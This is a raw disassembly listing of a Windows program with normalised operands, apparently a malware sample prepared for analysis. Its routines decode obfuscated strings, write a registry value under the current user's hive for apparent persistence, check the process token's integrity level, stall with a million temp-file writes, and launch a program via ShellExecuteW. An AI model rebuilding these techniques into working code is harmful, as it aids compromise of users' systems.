push [ ebp - 0x4 ]
and ecx 0x3
[ edi ] [ esi ]
call [ CreateFileA@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x2c ]
mov edx eax
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp - 0x38 ]
sub eax edx
lea edi [ ebx - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
push 0x3
mov ecx eax
mov eax [ ebp - 0x20 ]
pop edx
and ecx edx
[ edi ] [ esi ]
mov esi eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
lea edi [ ebx - 0x1 ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx edx
[ edi ] [ esi ]
lea edi [ ebx - 0x1 ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov eax [ ebp - 0x34 ]
mov esi r--data
movsw [ edi ] [ esi ]
mov esi eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
lea edi [ ebx - 0x1 ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ ebp - 0x24 ]
and ecx edx
[ edi ] [ esi ]
mov esi eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
lea edi [ ebx - 0x1 ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx edx
[ edi ] [ esi ]
and [ ebp - 0x3c ] 0x0
mov eax ebx
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push 0x0
sub eax ecx
lea ecx [ ebp - 0x3c ]
push ecx
push eax
push ebx
push [ ebp - 0x30 ]
call [ WriteFile@IAT ]
push [ ebp - 0x30 ]
call [ CloseHandle@IAT ]
push ebx
call sub_404a59
push [ ebp - 0x34 ]
call sub_404a59
push [ ebp - 0x4 ]
call sub_404a59
push [ ebp - 0x20 ]
call sub_404a59
push [ ebp - 0x24 ]
call sub_404a59
push [ ebp - 0x28 ]
call sub_404a59
push [ ebp - 0x8 ]
call sub_404a59
push [ ebp - 0x2c ]
call sub_404a59
push [ ebp - 0xc ]
call sub_404a0e
push [ ebp - 0x10 ]
call sub_404a0e
push [ ebp - 0x14 ]
call sub_404a0e
push [ ebp - 0x18 ]
call sub_404a0e
push [ ebp - 0x1c ]
call sub_404a0e
push [ ebp - 0x40 ]
call sub_404a0e
xor eax eax
add esp 0x38
inc eax
sub_4035ad
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push 0x10
pop ebx
push ebx
call sub_4046a3
mov esi eax
pop ecx
mov [ esi + 0x8 ] rw-data
mov [ esi + 0xc ] 0xb
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x1c
call sub_401000
mov [ ebp - 0xc ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0xe
call sub_401000
mov [ ebp - 0x10 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x2e
call sub_401000
mov [ ebp - 0x14 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x52
call sub_401000
push 0x18
pop edi
mov [ ebp - 0x18 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] edi
call sub_401000
mov [ ebp - 0x1c ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] ebx
call sub_401000
mov [ ebp - 0x20 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] edi
call sub_401000
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x2
push 0x0
push [ ebp - 0x1c ]
push 0x80000001
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push 0x2
mov edi 0x200
push edi
call sub_404a19
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x2
push edi
call sub_404a19
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
push eax
push [ ebp - 0x20 ]
call [ GetEnvironmentVariableW@IAT ]
cmp [ ebp - 0x8 ] r--data
jne r-xdata
call sub_403121
push [ ebp - 0x8 ]
mov edi [ lstrcatW@IAT ]
push [ ebp - 0x4 ]
call edi
push [ ebp - 0x4 ]
push [ ebp - 0x18 ]
mov edi [ lstrcatW@IAT ]
push [ ebp - 0x4 ]
call edi
push [ ebp - 0xc ]
push ebx
call edi
push r--data
push ebx
call edi
push [ ebp - 0x4 ]
push ebx
call edi
push [ ebp - 0x10 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea eax [ eax + eax + 0x2 ]
push eax
push ebx
push 0x1
push 0x0
push [ ebp - 0x14 ]
push [ ebp - 0x24 ]
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
push ebx
call edi
mov eax ebx
lea edx [ eax + 0x2 ]
push [ ebp - 0xc ]
call sub_404a0e
push [ ebp - 0x10 ]
call sub_404a0e
push [ ebp - 0x14 ]
call sub_404a0e
push [ ebp - 0x18 ]
call sub_404a0e
push [ ebp - 0x1c ]
call sub_404a0e
push [ ebp - 0x20 ]
call sub_404a0e
push esi
call sub_404a0e
push ebx
call sub_404a59
push [ ebp - 0x4 ]
call sub_404a59
xor eax eax
add esp 0x24
inc eax
push ebx
call sub_404a59
pop ecx
jmp r-xdata
sub_40377e
push ebp
mov ebp esp
push ecx
push ecx
call [ GetCurrentProcess@IAT ]
lea ecx [ ebp - 0x8 ]
push ecx
push 0x8
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
leave
retn
push esi
push edi
mov edi [ GetTokenInformation@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push 0x19
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push [ ebp - 0x4 ]
push 0x0
call [ LocalAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x4 ]
push esi
push 0x19
push [ ebp - 0x8 ]
call edi
test eax eax
je r-xdata
push esi
call [ LocalFree@IAT ]
push [ esi ]
call [ GetSidSubAuthorityCount@IAT ]
mov al [ eax ]
dec al
movzx eax al
push eax
push [ esi ]
call [ GetSidSubAuthority@IAT ]
mov eax [ eax ]
cmp eax 0x1000
jne r-xdata
cmp eax 0x2000
jb r-xdata
xor edi edi
cmp eax 0x3000
jb r-xdata
cmp eax 0x3000
jae r-xdata
pop edi
pop esi
cmp eax 0x4000
jb r-xdata
cmp eax 0x4000
jae r-xdata
xor edi edi
inc edi
jmp r-xdata
push 0x3
jmp r-xdata
push 0x2
push esi
call [ LocalFree@IAT ]
mov eax edi
jmp r-xdata
pop edi
jmp r-xdata
sub_403863
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi 0x104
push esi
push 0x8
mov [ edi ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
mov [ ebp - 0x4 ] esi
call [ GetUserNameW@IAT ]
call sub_40377e
mov esi eax
cmp esi 0x2
je r-xdata
push ebx
call sub_403c92
pop ecx
cmp eax 0xffffffff
jne r-xdata
cmp esi 0x3
jne r-xdata
test esi esi
jne r-xdata
mov [ edi ] 0x1
cmp [ edi ] 0x0
jne r-xdata
call sub_403115
push ebx
call sub_403c92
pop ecx
cmp eax 0xffffffff
je r-xdata
pop esi
pop ebx
leave
retn
xor al al
call sub_4035ad
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
sub_4038de
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x8 ] 0x0
push esi
mov esi [ HeapFree@IAT ]
push edi
mov edi [ GetProcessHeap@IAT ]
mov [ ebx ] r--data
jbe r-xdata
push [ ebx + 0x4 ]
push 0x8
call edi
push eax
call esi
pop edi
pop esi
leave
retn
mov eax [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
mov eax [ eax + ecx * 4 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x8 ]
jb r-xdata
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
push ecx
push 0x8
call edi
push eax
call esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x14 ]
test ecx ecx
je r-xdata
push ecx
push 0x8
call edi
push eax
call esi
mov eax [ ebp - 0x8 ]
push eax
call sub_404a0e
pop ecx
push ecx
push 0x8
call edi
push eax
call esi
mov eax [ ebp - 0x8 ]
sub_403966
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ GetProcessHeap@IAT ]
push esi
push edi
mov edi 0x104
push edi
push 0x8
call ebx
mov esi [ HeapAlloc@IAT ]
push eax
call esi
push edi
push 0x8
mov [ ebp - 0xc ] eax
call ebx
push eax
call esi
and [ ebp - 0x14 ] 0x0
push 0x14
push 0x8
mov [ ebp - 0x8 ] eax
call ebx
push eax
call esi
mov edi eax
test edi edi
je r-xdata
xor eax eax
push 0x2a
pop eax
push 0x200
push [ ebp - 0xc ]
mov [ edi + 0x12 ] ax
push r--data
call [ GetEnvironmentVariableW@IAT ]
push [ ebp - 0xc ]
mov esi [ lstrcatW@IAT ]
push [ ebp - 0x8 ]
call esi
push r--data
push [ ebp - 0x8 ]
call esi
push r--data
push [ ebp - 0x8 ]
call esi
push [ ebp - 0xc ]
push 0x8
call ebx
mov esi [ HeapFree@IAT ]
push eax
call esi
push 0x0
push 0x80
push 0x1
push 0x0
push 0x3
push 0xc0000000
push [ ebp - 0x8 ]
call [ CreateFileW@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0xf4240
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x3
push edi
push [ ebp - 0xc ]
call [ WriteFile@IAT ]
dec [ ebp - 0x10 ]
jne r-xdata
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push [ ebp - 0x8 ]
call [ CreateFileW@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0xf4240
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x3
push edi
push [ ebp - 0xc ]
call [ ReadFile@IAT ]
dec [ ebp - 0x10 ]
jne r-xdata
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
push [ ebp - 0x8 ]
push 0x8
call ebx
push eax
call esi
push [ ebp - 0x8 ]
call [ DeleteFileW@IAT ]
cmp [ edi + 0x12 ] 0x2a
push edi
push 0x8
je r-xdata
call ebx
push eax
call esi
push 0x10
call sub_4046a3
pop ecx
mov esi eax
push 0x28
pop edi
mov [ esi + 0x8 ] rw-data
mov [ esi + 0xc ] 0xb
mov [ esi ] rw-data
mov [ esi + 0x4 ] edi
call sub_401000
mov [ ebp - 0x14 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] edi
call sub_401000
mov [ ebp - 0x1c ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0xa
call sub_401000
lea edi [ ebp - 0x1 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x1 ] 0x0
call sub_403863
push 0xc
call sub_4046a3
xor edi edi
pop ecx
cmp eax edi
je r-xdata
call ebx
push eax
call esi
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
test al al
jne r-xdata
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
mov [ eax ] r--data
mov edi eax
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
and [ ebp - 0x8 ] 0x0
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
mov eax [ edi + 0x8 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx eax
jae r-xdata
mov ebx edi
call sub_4038de
push edi
call sub_404a0e
push [ ebp - 0x14 ]
call sub_404a0e
push [ ebp - 0x1c ]
call sub_404a0e
push [ ebp - 0x10 ]
call sub_404a0e
push esi
call sub_404a0e
add esp 0x14
cmp ebx eax
jae r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ edi + 0x4 ]
mov eax [ eax + ecx * 4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
xor eax eax
mov eax [ edi + 0x4 ]
mov eax [ eax + ebx * 4 ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
test al al
je r-xdata
mov eax [ edi + 0x8 ]
inc ebx
cmp ebx eax
jb r-xdata
mov eax [ edi ]
push ebx
mov ecx edi
call [ eax + 0x20 ]
cmp [ eax + 0x19 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
test al al
je r-xdata
push 0x200
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
push [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x10 ] eax
push 0x200
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
push [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
push [ ebp - 0x8 ]
mov [ ecx + 0x10 ] eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
push [ ebp - 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x1c ]
test al al
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
cmp [ ebp - 0x8 ] eax
jb r-xdata
push eax
call [ Sleep@IAT ]
sub_403c92
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x10
pop ebx
push ebx
call sub_4046a3
mov esi eax
pop ecx
mov [ esi + 0x8 ] rw-data
mov [ esi + 0xc ] 0xb
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x52
call sub_401000
mov [ ebp - 0x10 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x24
call sub_401000
mov [ ebp - 0x14 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x16
call sub_401000
mov [ ebp - 0x18 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x4a
call sub_401000
push 0x18
pop edi
mov [ ebp - 0x1c ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] edi
call sub_401000
mov [ ebp - 0x20 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] ebx
call sub_401000
mov [ ebp - 0x24 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] edi
call sub_401000
push 0x14
pop edi
mov [ ebp - 0x38 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] edi
call sub_401000
mov [ ebp - 0x3c ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] edi
call sub_401000
mov [ ebp - 0x28 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x1c
call sub_401000
mov [ ebp - 0x30 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0xe
call sub_401000
mov [ ebp - 0x2c ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x82
call sub_401000
mov [ ebp - 0x40 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x22
call sub_401000
mov edi [ GetProcessHeap@IAT ]
mov ebx 0x200
push ebx
push 0x8
mov [ ebp - 0x44 ] eax
call edi
push eax
call [ HeapAlloc@IAT ]
push ebx
push 0x8
mov [ ebp - 0x4 ] eax
call edi
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x8 ] eax
push ebx
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
push ebx
push 0x8
mov [ ebp - 0xc ] eax
call edi
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x8 ]
push r--data
push eax
mov [ ebp + 0x8 ] eax
call sub_404b0c
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_404b0c
add eax 0x2
push r--data
push eax
mov [ ebp + 0x8 ] eax
call sub_404b0c
add esp 0x10
push ebx
push [ ebp - 0x4 ]
push [ ebp - 0x18 ]
call [ GetEnvironmentVariableW@IAT ]
push [ ebp - 0x28 ]
push [ ebp - 0x4 ]
call [ lstrcatW@IAT ]
push [ ebp - 0x10 ]
push [ ebp - 0x4 ]
call [ lstrcatW@IAT ]
push [ ebp + 0x8 ]
push [ ebp - 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x4 ]
push [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push [ ebp - 0x1c ]
push r--data
push ebx
push [ ebp - 0x8 ]
call sub_404aee
add esp 0x28
push ebx
push [ ebp - 0xc ]
push [ ebp - 0x24 ]
call [ GetEnvironmentVariableW@IAT ]
xor eax eax
push eax
push eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push r--data
push eax
call [ ShellExecuteW@IAT ]
push [ ebp - 0x4 ]
push 0x8
call edi
mov ebx [ HeapFree@IAT ]
push eax
call ebx
push [ ebp - 0x8 ]
push 0x8
call edi
push eax
call ebx
push [ ebp - 0xc ]
push 0x8
call edi
push eax
call ebx
push [ ebp - 0x34 ]
push 0x8
call edi
push eax
call ebx
push esi
call sub_404a0e
push [ ebp - 0x10 ]
call sub_404a0e
push [ ebp - 0x14 ]
call sub_404a0e
push [ ebp - 0x18 ]
call sub_404a0e
push [ ebp - 0x1c ]
call sub_404a0e
push [ ebp - 0x20 ]
call sub_404a0e
push [ ebp - 0x24 ]
call sub_404a0e
push [ ebp - 0x38 ]
call sub_404a0e
push [ ebp - 0x3c ]
call sub_404a0e
push [ ebp - 0x28 ]
call sub_404a0e
push [ ebp - 0x40 ]
call sub_404a0e
push [ ebp - 0x44 ]
call sub_404a0e
add esp 0x30
or eax 0xffffffff
pop edi
pop esi
pop ebx
leave
retn
sub_403f3e
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov esi [ edi + 0x4 ]
xor edx edx
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
cmp edx [ ebp + 0x8 ]
jne r-xdata
push ebx
xor al al
test esi esi
je r-xdata
mov al bl
imul dl
add al [ ebx + rw-data ]
xor cl al
inc ebx
mov [ edx + esi ] cl
cmp ebx 0xa
jb r-xdata
inc edx
cmp edx [ ebp + 0x8 ]
jb r-xdata
mov al 0x1
jmp r-xdata
mov [ edi + 0x4 ] esi
mov cl [ edx + esi ]
xor ebx ebx
pop ebx
pop edi
pop esi
pop ebp
retn 0x4
sub_403f8f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi 0x104
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
leave
retn 0x4
xor edx edx
xor eax eax
movzx ebx [ edx + rw-data ]
add ebx eax
add eax [ ebp - 0x4 ]
xor esi ebx
inc edx
mov [ ecx ] esi
cmp edx 0xa
jb r-xdata
mov eax [ ebp - 0x8 ]
mov dx si
mov esi [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
add ecx 0x4
mov [ eax + esi * 2 ] dx
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov esi [ ecx ]
cmp esi 0xffffffff
je r-xdata
xor eax eax
sub_403ff8
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x10
call sub_4046a3
mov esi eax
pop ecx
mov [ esi + 0x8 ] rw-data
mov [ esi + 0xc ] 0xb
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x16
call sub_401000
mov [ ebp - 0x14 ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x14
call sub_401000
mov edi 0x200
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0x10 ]
push edi
push 0x8
call [ GetProcessHeap@IAT ]
mov esi [ HeapAlloc@IAT ]
push eax
call esi
push edi
push 0x8
mov [ ebp - 0x4 ] eax
call [ GetProcessHeap@IAT ]
push eax
call esi
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] eax
mov eax ebx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ecx
sar eax 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x2 ]
mov eax [ ebp - 0x8 ]
sub eax ebx
mov ecx ebx
mov [ ebp - 0x10 ] eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
push 0x2
sar eax 0x1
pop esi
cmp eax esi
jne r-xdata
mov edx [ ebp - 0x10 ]
inc [ ebp - 0xc ]
mov [ edx + ecx ] ax
mov eax ebx
add ecx 0x2
lea edx [ eax + 0x2 ]
push edi
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call [ GetEnvironmentVariableW@IAT ]
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x2 ]
mov eax ebx
xor ecx ecx
lea edi [ eax + 0x2 ]
mov si [ eax ]
add eax 0x2
test si si
jne r-xdata
sub eax edx
sar eax 0x1
cmp [ ebp - 0xc ] eax
jb r-xdata
mov dx [ eax ]
add eax esi
test dx dx
jne r-xdata
sub eax ecx
sar eax 0x1
mov ecx eax
mov eax ebx
lea edx [ eax + 0x2 ]
mov dx [ eax ]
add eax esi
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
je r-xdata
movzx eax [ ecx ]
cmp eax 0x5c
je r-xdata
mov di [ eax ]
add eax esi
test di di
jne r-xdata
jmp r-xdata
mov edi [ lstrcatW@IAT ]
push r--data
push [ ebp - 0x4 ]
call edi
mov esi [ ebp + 0x8 ]
push [ esi + 0x14 ]
mov ebx [ ebp - 0x4 ]
push ebx
call edi
push [ ebp - 0x8 ]
mov [ esi + 0x10 ] ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x14 ]
call sub_404a0e
push [ ebp - 0x18 ]
call sub_404a0e
pop ecx
pop ecx
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x4 ]
lea edi [ eax + 0x2 ]
sub eax edx
sar eax 0x1
cmp ecx eax
jb r-xdata
mov dx [ eax ]
add eax esi
test dx dx
jne r-xdata
mov dx [ ebx + ecx * 2 ]
sub eax edi
mov edi [ ebp - 0x4 ]
sar eax 0x1
mov [ edi + eax * 2 ] dx
mov eax ebx
inc ecx
lea edx [ eax + 0x2 ]
mov edx [ ebp - 0x4 ]
mov eax edx
lea esi [ eax + 0x2 ]
mov di [ eax ]
add eax esi
test di di
jne r-xdata
sub eax edx
sar eax 0x1
cmp ecx eax
jb r-xdata
mov di [ eax ]
add eax 0x2
test di di
jne r-xdata
sub eax esi
mov si [ ebx + ecx * 2 ]
sar eax 0x1
mov [ edx + eax * 2 ] si
mov eax ebx
inc ecx
lea edx [ eax + 0x2 ]
jmp r-xdata
mov di [ eax ]
add eax 0x2
test di di
jne r-xdata
sub_4041ec
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push 0x4
mov ebx ecx
push 0x8
mov [ ebx + 0x8 ] 0x1
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
xor esi esi
mov [ ebx + 0x4 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebx + 0x8 ] esi
jbe r-xdata
xor al al
jmp r-xdata
mov al 0x1
push edi
mov [ ebp - 0xc ] rw-data
mov [ ebp - 0x8 ] rw-data
jmp r-xdata
pop esi
pop ebx
leave
retn
push 0x28
call sub_4046a3
pop ecx
cmp eax esi
je r-xdata
push [ ebp - 0x8 ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
mov edi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov [ eax + 0x10 ] esi
mov [ eax + 0x14 ] esi
mov esi eax
push [ ebp - 0xc ]
mov [ esi + 0x14 ] edi
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
mov edi [ ebp - 0x4 ]
mov [ esi + 0x10 ] eax
mov eax [ edi * 4 + rw-data ]
mov [ esi + 0x24 ] eax
cmp [ edi * 4 + rw-data ] 0x0
setne al
mov [ esi + 0x18 ] al
mov eax [ edi * 4 + rw-data ]
mov [ esi + 0x20 ] eax
mov eax [ edi * 4 + rw-data ]
mov [ esi + 0xc ] eax
mov eax [ edi * 4 + rw-data ]
mov [ esi + 0x8 ] eax
mov eax [ edi * 4 + rw-data ]
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ edi * 4 + rw-data ] 0x0
push esi
setne al
mov [ esi + 0x19 ] al
mov eax [ edi * 4 + rw-data ]
mov [ esi + 0x1c ] eax
mov eax [ ebx ]
mov ecx ebx
call [ eax ]
mov eax [ ebx + 0x4 ]
inc [ ebp - 0x4 ]
add [ ebp - 0x8 ] 0xa0
add [ ebp - 0xc ] 0x20
mov [ eax + edi * 4 ] esi
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x8 ]
jb r-xdata
mov [ esi + 0x4 ] eax
xor esi esi
pop edi
sub_40431c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x24
cmp eax [ ecx + 0x8 ]
jb r-xdata
mov ecx [ ecx + 0x4 ]
push ebx
push esi
push edi
mov edi [ ecx + eax * 4 ]
push 0x10
call sub_4046a3
mov esi eax
pop ecx
mov [ esi + 0x8 ] rw-data
mov [ esi + 0xc ] 0xb
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x1f
call sub_401000
mov [ ebp - 0xc ] eax
mov [ esi ] rw-data
mov [ esi + 0x4 ] 0x14
call sub_401000
push r--data
mov [ ebp - 0x10 ] eax
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
xor al al
jmp r-xdata
xor al al
mov eax [ edi + 0x8 ]
push [ ebp - 0xc ]
mov esi [ GetProcAddress@IAT ]
mov [ ebp + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
push ebx
mov [ ebp - 0x20 ] eax
call esi
push [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
push ebx
call esi
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x102
call [ ebp - 0x8 ]
push [ ebp - 0x18 ]
mov esi [ GetProcessHeap@IAT ]
push 0x8
call esi
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x8
call esi
push eax
call ebx
cmp [ ebp - 0x8 ] 0x0
mov ebx eax
je r-xdata
leave
retn 0x4
test ebx ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp + 0x8 ]
push ebx
push 0x102
call [ ebp - 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] eax
jne r-xdata
push [ ebp - 0x8 ]
mov [ edi ] ebx
push 0x8
call esi
push eax
call [ HeapFree@IAT ]
push [ ebp - 0xc ]
call sub_404a0e
push [ ebp - 0x10 ]
call sub_404a0e
pop ecx
pop ecx
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
sub_404453
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ecx + 0x8 ]
jb r-xdata
mov edx [ ecx + 0x4 ]
push ebx
push esi
mov esi [ edx + eax * 4 ]
mov eax [ ecx ]
push edi
push esi
call [ eax + 0x8 ]
mov ecx [ esi + 0x24 ]
mov eax [ esi + 0x10 ]
xor ebx ebx
push ebx
cmp ecx 0x54
jne r-xdata
xor al al
jmp r-xdata
push ecx
jmp r-xdata
push 0x6
pop ebp
retn 0x4
push 0x2
push ebx
push 0x2
push 0x4
push eax
call [ CreateFileW@IAT ]
mov edi eax
